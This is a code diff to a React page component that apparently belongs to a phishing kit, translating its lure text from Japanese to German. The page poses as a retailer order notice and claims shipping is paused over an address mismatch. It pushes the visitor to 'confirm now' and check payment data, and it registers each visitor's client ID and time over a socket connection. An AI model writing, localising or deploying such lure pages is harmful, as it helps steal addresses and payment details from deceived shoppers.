@@ -28,7 +28,7 @@ export default function Home() {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
   const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
-  const orderPlacedDate = new Intl.DateTimeFormat('ja-JP', {
+  const orderPlacedDate = new Intl.DateTimeFormat('de-DE', {
     year: 'numeric',
     month: 'long',
     day: 'numeric',
@@ -67,7 +67,7 @@ export default function Home() {
       const clientId = getClientId();
       setActivated(true);
 
-      const registerTime = new Date().toLocaleString('ja-JP', {
+      const registerTime = new Date().toLocaleString('de-DE', {
         timeZone: 'Asia/Shanghai',
         hour12: false,
       });
@@ -89,7 +89,6 @@ export default function Home() {
       if (!socket.connected) {
         socket.connect();
         socket.once('connect', start);
-        // Best-effort fallback: don't block forever if connect event is missed.
         window.setTimeout(start, 900);
         return;
       }
@@ -105,42 +104,43 @@ export default function Home() {
       <div className="alz-shell">
         <div className="alz-home-grid alz-home-order-layout">
           <div className="alz-card alz-home-main-card">
-            <div className="alz-home-kicker">ご注文内容</div>
+            <div className="alz-home-kicker">Bestelluebersicht</div>
             <div className="alz-order-header">
               <div>
-                <h2 className="alz-page-title">配送先の確認が完了するまで配送は保留されています</h2>
+                <h2 className="alz-page-title">Der Versand bleibt pausiert, bis Ihre Lieferadresse bestaetigt wurde</h2>
                 <p className="alz-page-copy">
-                  この注文に登録されている配送先情報ではお届けを完了できませんでした。下記の配送情報をご確認のうえ、お手続きを続けてください。
+                  Die hinterlegte Lieferadresse fuer diese Bestellung konnte nicht abschliessend bestaetigt werden.
+                  Bitte pruefen Sie die Lieferdaten unten, damit die Zustellung fortgesetzt werden kann.
                 </p>
               </div>
               <div className="alz-order-id">
-                <span>注文番号</span>
+                <span>Bestellnummer</span>
                 <strong>{orderNumber}</strong>
               </div>
             </div>
 
             <div className="alz-home-mobile-strip">
-              <span>注文番号 {orderNumber}</span>
-              <strong>保留中</strong>
+              <span>Bestellnummer {orderNumber}</span>
+              <strong>Pausiert</strong>
             </div>
 
             <div className="alz-order-product">
               <div className="alz-order-product-thumb" />
               <div className="alz-order-product-copy">
-                <div className="alz-order-product-title">この注文は配送確認が必要です</div>
-                <div className="alz-order-product-meta">配送先情報が確認されるまで、1点の商品をお届けできません。</div>
-                <div className="alz-order-product-meta">注文日 {orderPlacedDate}</div>
+                <div className="alz-order-product-title">Fuer diese Bestellung ist eine Lieferbestaetigung erforderlich</div>
+                <div className="alz-order-product-meta">Ein Artikel kann erst zugestellt werden, nachdem Ihre Lieferdaten bestaetigt wurden.</div>
+                <div className="alz-order-product-meta">Bestelldatum {orderPlacedDate}</div>
               </div>
-              <div className="alz-order-product-price">保留中</div>
+              <div className="alz-order-product-price">Pausiert</div>
             </div>
 
             <div className="alz-order-panel-grid">
               <section className="alz-order-panel">
-                <div className="alz-order-panel-title">確認が必要な理由</div>
-                <div className="alz-order-panel-copy">この注文に登録されている配送情報に不一致が見つかりました。内容を確認すると配送手続きが再開されます。</div>
+                <div className="alz-order-panel-title">Warum eine Pruefung noetig ist</div>
+                <div className="alz-order-panel-copy">Bei den gespeicherten Lieferdaten wurde eine Abweichung erkannt. Nach der Bestaetigung wird der Versand automatisch fortgesetzt.</div>
                 <div className="alz-order-panel-meta">
-                  <span>現在この配送は保留中です</span>
-                  <strong>確認後に配送が再開されます</strong>
+                  <span>Diese Lieferung ist aktuell pausiert</span>
+                  <strong>Nach der Pruefung wird der Versand fortgesetzt</strong>
                 </div>
               </section>
             </div>
@@ -152,32 +152,32 @@ export default function Home() {
             </div>
 
             <div className="alz-order-action">
-              <div className="alz-order-action-alert">追加の配送遅延を防ぐため、今すぐこの注文を確認してください。</div>
+              <div className="alz-order-action-alert">Bitte bestaetigen Sie diese Bestellung jetzt, um weitere Lieferverzoegerungen zu vermeiden.</div>
               <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
-                {loading ? '読み込み中...' : '配送先情報を確認する'}
+                {loading ? 'Wird geladen...' : 'Lieferdaten bestaetigen'}
               </button>
-              <p className="alz-helper-copy">通常は2分以内で完了します。</p>
+              <p className="alz-helper-copy">Der Vorgang dauert normalerweise weniger als 2 Minuten.</p>
             </div>
 
             <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
           <aside className="alz-card alz-home-aside-card alz-side-summary">
-            <div className="alz-side-summary-title">配送状況</div>
+            <div className="alz-side-summary-title">Versandstatus</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">配送確認が必要です</div>
-                <div className="alz-order-mini-copy">この注文の1点について、最新の配送情報が必要です。</div>
+                <div className="alz-order-mini-title">Lieferbestaetigung erforderlich</div>
+                <div className="alz-order-mini-copy">Fuer einen Artikel dieser Bestellung werden aktuelle Lieferdaten benoetigt.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>配送先住所の確認</div>
-              <div>請求情報の確認</div>
-              <div>確認後に出荷再開</div>
+              <div>Lieferadresse bestaetigen</div>
+              <div>Zahlungsdaten pruefen</div>
+              <div>Versand danach fortsetzen</div>
             </div>
-            <div className="alz-side-summary-box">必要な情報の確認後、配送が再開されます。</div>
-            <div className="alz-side-summary-help">お困りの場合は、カスタマーサービスをご利用ください。</div>
+            <div className="alz-side-summary-box">Nach der Bestaetigung der erforderlichen Angaben wird der Versand wieder aufgenommen.</div>
+            <div className="alz-side-summary-help">Wenn Sie Hilfe benoetigen, wenden Sie sich an den Kundenservice.</div>
           </aside>
         </div>
       </div>
